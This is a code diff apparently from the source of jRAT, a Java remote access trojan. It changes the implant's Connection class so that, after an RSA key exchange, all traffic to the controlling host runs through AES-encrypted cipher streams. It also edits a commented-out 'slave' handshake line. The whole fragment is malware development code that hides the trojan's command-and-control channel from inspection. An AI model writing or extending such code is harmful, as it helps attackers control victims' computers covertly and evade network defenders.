@@ -12,9 +12,16 @@ import java.net.Socket;
 import java.security.PublicKey;
 import java.util.Locale;
 
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.CipherOutputStream;
+import javax.crypto.spec.SecretKeySpec;
+
+import se.jrat.common.ConnectionCodes;
 import se.jrat.common.Version;
 import se.jrat.common.codec.Hex;
 import se.jrat.common.crypto.Crypto;
+import se.jrat.common.crypto.CryptoUtils;
 import se.jrat.common.crypto.KeyExchanger;
 import se.jrat.common.io.StringWriter;
 import se.jrat.common.utils.UserUtils;
@@ -77,7 +84,6 @@ public class Connection implements Runnable {
 			socket = new Socket(address.getAddress(), address.getPort());
 
 			socket.setSoTimeout(Configuration.timeout);
-			//socket.setTrafficClass(24);
 
 			Connection.inputStream = socket.getInputStream();
 			Connection.outputStream = socket.getOutputStream();
@@ -85,7 +91,7 @@ public class Connection implements Runnable {
 			Connection.dis = new DataInputStream(inputStream);
 			Connection.dos = new DataOutputStream(outputStream);
 	        
-			// outputStream.write(ConnectionCodes.DESKTOP_SLAVE); TODO Removed to make jRAT backwards compatible
+			//outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
 			
 			KeyExchanger exchanger = new KeyExchanger(dis, dos, Main.getKeyPair());
 			exchanger.readRemotePublicKey();
@@ -96,8 +102,19 @@ public class Connection implements Runnable {
 			byte[] encKey = new byte[len];
 			dis.readFully(encKey);
 			Main.aesKey = Crypto.decrypt(encKey, Main.getKeyPair().getPrivate(), "RSA");
-									
+					
+			SecretKeySpec secretKey = new SecretKeySpec(Main.aesKey, "AES");
+			
 			Main.encryption = inputStream.read() == 1;
+			
+			Cipher inCipher = CryptoUtils.getCipher(Cipher.DECRYPT_MODE, secretKey);
+			Cipher outCipher = CryptoUtils.getCipher(Cipher.ENCRYPT_MODE, secretKey);
+			
+			Connection.inputStream = new CipherInputStream(socket.getInputStream(), inCipher);
+			Connection.outputStream = new CipherOutputStream(socket.getOutputStream(), outCipher);
+
+			Connection.dis = new DataInputStream(inputStream);
+			Connection.dos = new DataOutputStream(outputStream);
 
 			initialize();
 
